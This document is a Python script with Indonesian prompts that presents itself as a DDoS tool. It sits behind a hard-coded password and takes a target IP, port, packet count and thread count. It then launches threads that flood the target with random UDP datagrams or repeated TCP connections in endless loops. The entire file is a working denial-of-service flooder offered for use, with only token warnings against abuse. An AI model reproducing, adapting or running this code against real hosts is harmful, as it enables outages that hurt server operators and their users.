import random
import socket
import threading
import time
import sys
import os
from os import system

os.system("clear")
print("\033[96m")
print("MASUKIN PW UNTUK AKSES DDOS")
print("""
██████╗░░██╗░░░░░░░██╗
██╔══██╗░██║░░██╗░░██║
██████╔╝░╚██╗████╗██╔╝
██╔═══╝░░░████╔═████║░
╚═╝░░░░░░░░╚═╝░░░╚═╝░░
""")
password = "Lnsky"

for i in range(3):
	pwd = input("\033[96mPASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(3)
		print("\033[96mPASSWORD BENAR👍")
		break
	else:
		time.sleep(5)
		print("\033[91mPASSWORD SALAH PERBAIKI")
		continue
time.sleep(3)
print("\033[91mPASSWORD YANG BENER LAGI INI SALAH")
os.system("clear")
print("\033[91m")
print ("---------------WARNING⚠︎---------------")
print ("TUNGGU 10 DETIK UNTUK DDOS")
print ("DDOS ITU BERBAU ILEGAL JADI")
print ("JANGAN DI BUAT ABUSE")
print ("---------------WARNING⚠︎---------------")

time.sleep(10)

os.system("clear")
print("\033[96m")
print("""\033[96m
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
""")
print ("Mau Pake Tols? Ketik Bawah")
print ("Lnsky-Ddos-Attack")
print ("Jangan Abuse Adik Adik")

test = input()
if test == "y":
    exit(0)
os.system("clear")
print ("TUNGGU 5DETIK OKE")
time.sleep(5)
os.system("clear")
print ("TOLS DDOS BY LNSKY ONLINE👍")
print ("SILAKAN MENG DDOS")
time.sleep(2)
os.system("clear")
print ("SELAMAT DATANG DI TOLS DDOS BY LNSKY😎")
print("""\033[96m
██╗░░░░░███╗░░██╗░██████╗██╗░░██╗██╗░░░██╗
██║░░░░░████╗░██║██╔════╝██║░██╔╝╚██╗░██╔╝
██║░░░░░██╔██╗██║╚█████╗░█████═╝░░╚████╔╝░
██║░░░░░██║╚████║░╚═══██╗██╔═██╗░░░╚██╔╝░░
███████╗██║░╚███║██████╔╝██║░╚██╗░░░██║░░░
╚══════╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░
""")
print("XC IN AJEEEEEE")
ip = str(input(" IP TARGET:"))
port = int(input(" PORT TARGET:"))
choice = str(input("Gas?(y/n):"))
times = int(input(" PAKET UNTUK DI KIRIM :"))
threads = int(input(" BONUS PAKET:"))
print ("1")
time.sleep(1)
print ("2")
time.sleep(1)
print ("3")
time.sleep(1)
print ("4")
time.sleep(1)
print ("5 ATTACK MULAI")
time.sleep(2)
os.system("clear")
def ddos():
	data = random._urandom(900)
	i = random.choice(("\033[96m[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ⚠︎ ATTACK BY LNSKY ⚠︎!!!")
		except:
			print("[X]  SERVER DOWN ⚠︎!!!")

def ddos2():
	data = random._urandom(900)
	i = random.choice(("\033[96m[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ⚠︎ ATTACK BY LNSKY ⚠︎!!!")
		except:
			s.close()
			print("[X]  SERVER DOWN ⚠︎!!!")

def ddos3():
	data = random._urandom(16)
	i = random.choice(("\033[96m[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ⚠︎ ATTACK BY LNSKY ⚠︎!!!")
		except:
			s.close()
			print("[X]  SERVER DOWN ⚠︎!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()